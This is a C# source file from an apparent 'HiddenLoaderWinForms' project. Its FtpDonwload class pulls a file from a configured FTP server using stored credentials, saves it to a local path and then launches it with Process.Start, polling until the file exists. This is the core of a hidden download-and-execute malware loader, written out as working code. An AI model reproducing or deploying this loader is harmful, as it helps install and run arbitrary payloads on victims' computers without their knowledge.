using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace HiddenLoaderWinForms.Download
{
    public class FtpDonwload
    {
        private static string _ftpUsername;
        private static string _ftpPassword;
        private static string _ftpAddress;

        public static void Setup(string user, string password, string address)
        {
            _ftpUsername = user;
            _ftpPassword = password;
            _ftpAddress = address;
        }

        public static void Download()
        {
            if (_ftpUsername != string.Empty & _ftpPassword != string.Empty & _ftpAddress != string.Empty)
            {
                try
                {
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(_ftpAddress); //creating ftp web request
                    request.Method = WebRequestMethods.Ftp.DownloadFile; // select request method
                    request.Credentials = new NetworkCredential(_ftpUsername, _ftpPassword); //initialize user for web request
                    FtpWebResponse response = (FtpWebResponse)request.GetResponse(); 
                    Stream responseStream = response.GetResponseStream();
                    FileStream file = File.Create(Config.DownloadPathDir); //creating file
                    byte[] bufferSize = new byte[512 * 1024]; //set buffer size
                    int read;
                    while (responseStream != null && (read = responseStream.Read(bufferSize, 0, bufferSize.Length)) > 0)
                    {
                        file.Write(bufferSize, 0, read);
                    }
                    file.Close();
                    responseStream?.Close();
                    response.Close();
                }
                catch (Exception)
                {
                    throw new Exception("Cannot download or write file");
                }
            }
            else
            {
                throw new Exception("FTP credits is missing");
            }
        }

        public static void StartFile()
        {
            try
            {
                if (File.Exists(Config.DownloadPathDir))
                {
                    MessageBox.Show(Config.DownloadPathDir);
                    if (Process.GetProcessesByName(Config.FileName).Length == 0) //check on exist process
                    {
                        Process.Start(Config.DownloadPathDir); //run downloaded file
                    }
                }
                else
                {
                    Thread.Sleep(1000);
                    StartFile();
                }
            }
            catch (Exception e)
            {
                throw new Exception("Something wrong with file");
            }

        }
    }
}